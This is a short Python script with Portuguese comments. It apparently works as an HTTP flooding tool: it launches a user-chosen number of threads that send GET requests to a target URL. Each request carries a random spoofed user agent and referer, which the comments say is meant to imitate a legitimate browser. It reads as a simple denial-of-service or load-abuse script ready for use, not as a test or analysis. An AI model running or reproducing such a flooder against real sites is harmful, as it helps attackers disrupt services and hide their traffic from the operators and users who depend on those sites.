import requests
import threading
import time
import sys
import random

def load_file_contents(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

def keep_request_alive(url, duration, user_agents, referers):
    # Selecionando um user-agent e um referer aleatórios
    user_agent = random.choice(user_agents)
    referer = random.choice(referers)
    
    # Definindo os cabeçalhos HTTP para simular um navegador de usuário legítimo
    headers = {
        'User-Agent': user_agent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Referer': referer,
        'Connection': 'keep-alive',
        'DNT': '1',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document'
    }
    
    try:
        # Realizando a solicitação GET com os cabeçalhos definidos
        response = requests.get(url, headers=headers, timeout=duration)
        # Mantendo a solicitação pelo período especificado
        time.sleep(duration)
        print(f"Resposta {response.status_code} de {url} com headers {headers}")
    except requests.exceptions.RequestException as e:
        print(f"Erro: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Uso: python script.py <url> <duration> <threads>")
        sys.exit(1)

    url = sys.argv[1]
    duration = int(sys.argv[2])
    thread_count = int(sys.argv[3])

    user_agents = load_file_contents("useragents.txt")
    referers = load_file_contents("referers.txt")

    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=keep_request_alive, args=(url, duration, user_agents, referers))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print("Todas as solicitações foram completadas.")